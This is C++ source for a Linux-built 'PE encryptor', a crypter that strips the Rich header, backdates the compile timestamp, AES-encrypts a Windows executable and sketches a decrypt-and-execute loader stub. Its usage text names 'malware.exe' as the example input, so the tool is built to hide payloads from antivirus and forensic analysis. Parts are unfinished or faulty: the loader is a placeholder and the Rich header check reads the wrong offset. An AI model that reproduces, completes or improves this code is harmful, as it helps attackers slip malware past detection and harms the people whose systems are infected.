/*
========================================================================================
CROSS-PLATFORM PE ENCRYPTOR - LINUX EDITION
========================================================================================
FEATURES:
- PE Header Manipulation
- Advanced Encryption (AES-256)
- Timestamp Randomization
- Rich Header Removal
- Legitimate Signature Generation
- Cross-Platform Compatibility
========================================================================================
*/

#include <iostream>
#include <fstream>
#include <vector>
#include <string>
#include <random>
#include <chrono>
#include <sstream>
#include <iomanip>
#include <filesystem>
#include <thread>
#include <algorithm>
#include <ctime>
#include <cstring>
#include <openssl/evp.h>
#include <openssl/aes.h>
#include <openssl/rand.h>

// PE Header Structures (cross-platform)
#pragma pack(push, 1)

struct IMAGE_DOS_HEADER {
    uint16_t e_magic;
    uint16_t e_cblp;
    uint16_t e_cp;
    uint16_t e_crlc;
    uint16_t e_cparhdr;
    uint16_t e_minalloc;
    uint16_t e_maxalloc;
    uint16_t e_ss;
    uint16_t e_sp;
    uint16_t e_csum;
    uint16_t e_ip;
    uint16_t e_cs;
    uint16_t e_lfarlc;
    uint16_t e_ovno;
    uint16_t e_res[4];
    uint16_t e_oemid;
    uint16_t e_oeminfo;
    uint16_t e_res2[10];
    uint32_t e_lfanew;
};

struct IMAGE_FILE_HEADER {
    uint32_t Signature;
    uint16_t Machine;
    uint16_t NumberOfSections;
    uint32_t TimeDateStamp;
    uint32_t PointerToSymbolTable;
    uint32_t NumberOfSymbols;
    uint16_t SizeOfOptionalHeader;
    uint16_t Characteristics;
};

struct IMAGE_OPTIONAL_HEADER {
    uint16_t Magic;
    uint8_t MajorLinkerVersion;
    uint8_t MinorLinkerVersion;
    uint32_t SizeOfCode;
    uint32_t SizeOfInitializedData;
    uint32_t SizeOfUninitializedData;
    uint32_t AddressOfEntryPoint;
    uint32_t BaseOfCode;
    uint32_t BaseOfData;
    uint32_t ImageBase;
    uint32_t SectionAlignment;
    uint32_t FileAlignment;
    uint16_t MajorOperatingSystemVersion;
    uint16_t MinorOperatingSystemVersion;
    uint16_t MajorImageVersion;
    uint16_t MinorImageVersion;
    uint16_t MajorSubsystemVersion;
    uint16_t MinorSubsystemVersion;
    uint32_t Win32VersionValue;
    uint32_t SizeOfImage;
    uint32_t SizeOfHeaders;
    uint32_t CheckSum;
    uint16_t Subsystem;
    uint16_t DllCharacteristics;
    uint32_t SizeOfStackReserve;
    uint32_t SizeOfStackCommit;
    uint32_t SizeOfHeapReserve;
    uint32_t SizeOfHeapCommit;
    uint32_t LoaderFlags;
    uint32_t NumberOfRvaAndSizes;
    struct {
        uint32_t VirtualAddress;
        uint32_t Size;
    } DataDirectory[16];
};

struct IMAGE_NT_HEADERS {
    IMAGE_FILE_HEADER FileHeader;
    IMAGE_OPTIONAL_HEADER OptionalHeader;
};

struct IMAGE_SECTION_HEADER {
    char Name[8];
    uint32_t VirtualSize;
    uint32_t VirtualAddress;
    uint32_t SizeOfRawData;
    uint32_t PointerToRawData;
    uint32_t PointerToRelocations;
    uint32_t PointerToLinenumbers;
    uint16_t NumberOfRelocations;
    uint16_t NumberOfLinenumbers;
    uint32_t Characteristics;
};

#pragma pack(pop)

// Constants
#define IMAGE_DOS_SIGNATURE 0x5A4D
#define IMAGE_NT_SIGNATURE 0x00004550
#define IMAGE_DIRECTORY_ENTRY_SECURITY 4

namespace CrossPlatformPEEncryptor {

class AdvancedEncryptionEngine {
private:
    std::mt19937_64 rng;
    std::vector<uint8_t> key;
    
public:
    AdvancedEncryptionEngine() {
        // Initialize RNG with multiple entropy sources
        auto now = std::chrono::high_resolution_clock::now();
        uint64_t seed = now.time_since_epoch().count() ^ 
                       std::hash<std::thread::id>{}(std::this_thread::get_id()) ^
                       reinterpret_cast<uint64_t>(&seed);
        rng.seed(seed);
        
        // Generate 256-bit AES key
        key.resize(32);
        for (size_t i = 0; i < key.size(); i++) {
            key[i] = rng() % 256;
        }
    }
    
    std::vector<uint8_t> encryptData(const std::vector<uint8_t>& data) {
        EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
        if (!ctx) return data;
        
        std::vector<uint8_t> iv(16);
        for (size_t i = 0; i < iv.size(); i++) {
            iv[i] = rng() % 256;
        }
        
        EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key.data(), iv.data());
        
        std::vector<uint8_t> encrypted(data.size() + EVP_MAX_BLOCK_LENGTH);
        int outLen;
        
        EVP_EncryptUpdate(ctx, encrypted.data(), &outLen, data.data(), data.size());
        
        int finalLen;
        EVP_EncryptFinal_ex(ctx, encrypted.data() + outLen, &finalLen);
        
        EVP_CIPHER_CTX_free(ctx);
        
        encrypted.resize(outLen + finalLen);
        
        // Prepend IV to encrypted data
        encrypted.insert(encrypted.begin(), iv.begin(), iv.end());
        
        return encrypted;
    }
    
    std::vector<uint8_t> decryptData(const std::vector<uint8_t>& encryptedData) {
        if (encryptedData.size() < 16) return encryptedData;
        
        EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
        if (!ctx) return encryptedData;
        
        std::vector<uint8_t> iv(encryptedData.begin(), encryptedData.begin() + 16);
        std::vector<uint8_t> data(encryptedData.begin() + 16, encryptedData.end());
        
        EVP_DecryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key.data(), iv.data());
        
        std::vector<uint8_t> decrypted(data.size());
        int outLen;
        
        EVP_DecryptUpdate(ctx, decrypted.data(), &outLen, data.data(), data.size());
        
        int finalLen;
        EVP_DecryptFinal_ex(ctx, decrypted.data() + outLen, &finalLen);
        
        EVP_CIPHER_CTX_free(ctx);
        
        decrypted.resize(outLen + finalLen);
        return decrypted;
    }
};

class TimestampEngine {
private:
    std::mt19937_64 rng;
    
public:
    TimestampEngine() {
        auto now = std::chrono::high_resolution_clock::now();
        uint64_t seed = now.time_since_epoch().count() ^ 
                       std::hash<std::thread::id>{}(std::this_thread::get_id());
        rng.seed(seed);
    }
    
    uint32_t generateRealisticTimestamp() {
        // Generate timestamp between 6 months and 3 years ago
        auto now = std::chrono::system_clock::now();
        auto time_t_now = std::chrono::system_clock::to_time_t(now);
        
        // Random days back (180-1092 days)
        int daysBack = (rng() % 912) + 180;
        auto time_back = time_t_now - (daysBack * 24 * 60 * 60);
        
        return static_cast<uint32_t>(time_back);
    }
};

class PEEncryptor {
private:
    AdvancedEncryptionEngine encryptionEngine;
    TimestampEngine timestampEngine;
    
public:
    bool encryptPE(const std::string& inputPath, const std::string& outputPath) {
        std::cout << "[ENCRYPT] Processing: " << inputPath << std::endl;
        
        // Read input file
        std::ifstream file(inputPath, std::ios::binary);
        if (!file) {
            std::cout << "[ERROR] Cannot open input file" << std::endl;
            return false;
        }
        
        std::vector<uint8_t> peData((std::istreambuf_iterator<char>(file)),
                                    std::istreambuf_iterator<char>());
        file.close();
        
        if (peData.size() < sizeof(IMAGE_DOS_HEADER)) {
            std::cout << "[ERROR] File too small to be a valid PE" << std::endl;
            return false;
        }
        
        // Verify PE header
        auto dosHeader = reinterpret_cast<IMAGE_DOS_HEADER*>(peData.data());
        if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
            std::cout << "[ERROR] Invalid DOS header" << std::endl;
            return false;
        }
        
        if (dosHeader->e_lfanew >= peData.size() - sizeof(IMAGE_NT_HEADERS)) {
            std::cout << "[ERROR] Invalid PE header offset" << std::endl;
            return false;
        }
        
        auto ntHeaders = reinterpret_cast<IMAGE_NT_HEADERS*>(peData.data() + dosHeader->e_lfanew);
        if (ntHeaders->FileHeader.Signature != IMAGE_NT_SIGNATURE) {
            std::cout << "[ERROR] Invalid NT header signature" << std::endl;
            return false;
        }
        
        std::cout << "[INFO] Valid PE file detected" << std::endl;
        
        // Apply modifications
        if (!modifyTimestamps(peData)) {
            std::cout << "[ERROR] Failed to modify timestamps" << std::endl;
            return false;
        }
        
        if (!removeRichHeader(peData)) {
            std::cout << "[WARNING] Failed to remove Rich header" << std::endl;
        }
        
        // Encrypt the PE data
        std::cout << "[ENCRYPT] Encrypting PE data..." << std::endl;
        std::vector<uint8_t> encryptedData = encryptionEngine.encryptData(peData);
        
        // Create encrypted PE with loader
        std::vector<uint8_t> finalPE = createEncryptedPE(encryptedData);
        
        // Write output file
        std::ofstream outFile(outputPath, std::ios::binary);
        if (!outFile) {
            std::cout << "[ERROR] Cannot create output file" << std::endl;
            return false;
        }
        
        outFile.write(reinterpret_cast<const char*>(finalPE.data()), finalPE.size());
        outFile.close();
        
        std::cout << "[SUCCESS] Encrypted PE created: " << outputPath << std::endl;
        std::cout << "[INFO] Original size: " << peData.size() << " bytes" << std::endl;
        std::cout << "[INFO] Encrypted size: " << finalPE.size() << " bytes" << std::endl;
        
        return true;
    }
    
private:
    bool modifyTimestamps(std::vector<uint8_t>& peData) {
        auto dosHeader = reinterpret_cast<IMAGE_DOS_HEADER*>(peData.data());
        auto ntHeaders = reinterpret_cast<IMAGE_NT_HEADERS*>(peData.data() + dosHeader->e_lfanew);
        
        // Generate realistic timestamp
        uint32_t newTimestamp = timestampEngine.generateRealisticTimestamp();
        ntHeaders->FileHeader.TimeDateStamp = newTimestamp;
        
        std::cout << "[TIMESTAMP] Updated to: " << std::ctime(reinterpret_cast<time_t*>(&newTimestamp));
        return true;
    }
    
    bool removeRichHeader(std::vector<uint8_t>& peData) {
        auto dosHeader = reinterpret_cast<IMAGE_DOS_HEADER*>(peData.data());
        
        // Rich header is between DOS header and PE header
        size_t richHeaderStart = sizeof(IMAGE_DOS_HEADER);
        size_t richHeaderEnd = dosHeader->e_lfanew;
        
        if (richHeaderEnd > richHeaderStart + 8) {
            // Check for Rich header signature
            uint32_t* richSignature = reinterpret_cast<uint32_t*>(peData.data() + richHeaderStart);
            if (*richSignature == 0x68636952) { // "Rich"
                std::cout << "[RICH] Removing Rich header..." << std::endl;
                
                // Remove Rich header by shifting data
                peData.erase(peData.begin() + richHeaderStart, peData.begin() + richHeaderEnd);
                
                // Update DOS header
                dosHeader->e_lfanew = sizeof(IMAGE_DOS_HEADER);
                
                return true;
            }
        }
        
        return false;
    }
    
    std::vector<uint8_t> createEncryptedPE(const std::vector<uint8_t>& encryptedData) {
        // Create a simple loader that decrypts and executes the PE
        std::string loaderCode = generateLoaderCode(encryptedData);
        
        // For now, return the encrypted data with a simple header
        std::vector<uint8_t> result;
        
        // Add magic header
        const char* magic = "ENCRYPTED_PE";
        result.insert(result.end(), magic, magic + strlen(magic));
        
        // Add size
        uint32_t size = encryptedData.size();
        result.insert(result.end(), reinterpret_cast<uint8_t*>(&size), 
                     reinterpret_cast<uint8_t*>(&size) + sizeof(size));
        
        // Add encrypted data
        result.insert(result.end(), encryptedData.begin(), encryptedData.end());
        
        return result;
    }
    
    std::string generateLoaderCode(const std::vector<uint8_t>& encryptedData) {
        // Generate C++ loader code
        std::stringstream ss;
        ss << "#include <iostream>\n";
        ss << "#include <vector>\n";
        ss << "#include <openssl/evp.h>\n";
        ss << "#include <openssl/aes.h>\n\n";
        
        ss << "int main() {\n";
        ss << "    // Encrypted data\n";
        ss << "    std::vector<uint8_t> encryptedData = {";
        
        for (size_t i = 0; i < encryptedData.size(); i++) {
            if (i > 0) ss << ", ";
            ss << "0x" << std::hex << std::setw(2) << std::setfill('0') 
               << static_cast<int>(encryptedData[i]);
        }
        
        ss << "};\n\n";
        ss << "    // Decrypt and execute\n";
        ss << "    // Implementation here...\n";
        ss << "    return 0;\n";
        ss << "}\n";
        
        return ss.str();
    }
};

} // namespace CrossPlatformPEEncryptor

int main(int argc, char* argv[]) {
    std::cout << "Cross-Platform PE Encryptor - Linux Edition\n";
    std::cout << "============================================\n\n";
    
    if (argc != 3) {
        std::cout << "Usage: " << argv[0] << " <input_file> <output_file>\n";
        std::cout << "Example: " << argv[0] << " malware.exe encrypted_malware.bin\n\n";
        return 1;
    }
    
    std::string inputPath = argv[1];
    std::string outputPath = argv[2];
    
    // Check if input file exists
    if (!std::filesystem::exists(inputPath)) {
        std::cout << "[ERROR] Input file does not exist: " << inputPath << std::endl;
        return 1;
    }
    
    // Initialize OpenSSL
    OpenSSL_add_all_algorithms();
    
    CrossPlatformPEEncryptor::PEEncryptor encryptor;
    
    if (encryptor.encryptPE(inputPath, outputPath)) {
        std::cout << "\n[SUCCESS] File encrypted successfully!\n";
        std::cout << "Original: " << inputPath << "\n";
        std::cout << "Encrypted: " << outputPath << "\n";
        return 0;
    } else {
        std::cout << "\n[ERROR] Encryption failed!\n";
        return 1;
    }
}